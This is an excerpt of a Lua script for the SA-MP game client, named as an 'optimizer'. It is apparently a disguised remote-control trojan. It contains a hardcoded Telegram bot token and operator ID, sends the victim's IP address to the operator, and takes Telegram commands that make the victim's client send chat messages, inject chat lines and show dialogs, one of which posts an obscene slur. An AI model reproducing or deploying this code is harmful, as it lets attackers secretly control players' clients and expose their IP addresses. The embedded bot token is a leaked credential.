...
oldName = 'Optimizer_v3.lua'

botToken = '6885037735:AAFKSvMRe40EhRRdQT9AmK_E0Kwg9f0ILiA'
userID = 6314242344
...
do
  ...
  function telegram.onUpdate(update)
    ...
    if types.is('message') then
      ...
      local text = u8:decode(msg.text)

      if text:find('^!send (.+)') then
        local inmsg = text:match('^!send (.+)')
        sampSendChat(inmsg)
        telegram.api.sendMessage({
          chat_id = update.message.chat.id;
          text = u8'Сообщение отправлено!';
      ...
      if text:find('^!add (.+)') then
        local message = text:match('^!add (.+)')
        sampAddChatMessage(message, -1)
        telegram.api.sendMessage({
          chat_id = update.message.chat.id;
          text = u8'Сообщение добавлено в чат игрока!';
          reply_to_message_id = update.message.message_id;
          reply_markup = encodeJson({})
        })
      end

      if text:find('^!dialog (.+)') then
        local message = text:match('^!dialog (.+)')
        sampShowDialog(1488, 'Notification', message, 'OK', nil, 0)
        telegram.api.sendMessage({
          chat_id = update.message.chat.id;
          text = u8'Диалог показан игроку!';
          reply_to_message_id = update.message.message_id;
          reply_markup = encodeJson({})
        })
      end
    ...
    elseif types.is('callback_query') then
      ...
      elseif payload == 'nocasino' then
          sampAddChatMessage('КТО ИГРАЕТ В КАЗИНО - ТОТ ЕБУЧИЙ ПИДОРАС!', -1)
...
function main()
    ...
    optimizer_dir = getWorkingDirectory()..'//'..oldName
    ...
    telegram.api.sendMessage({
        chat_id = tostring(userID);
        text = 'Controll Panel    ROMAN    IP: '..getMyIp();
        reply_markup = encodeJson({
          inline_keyboard = {
            {
              {
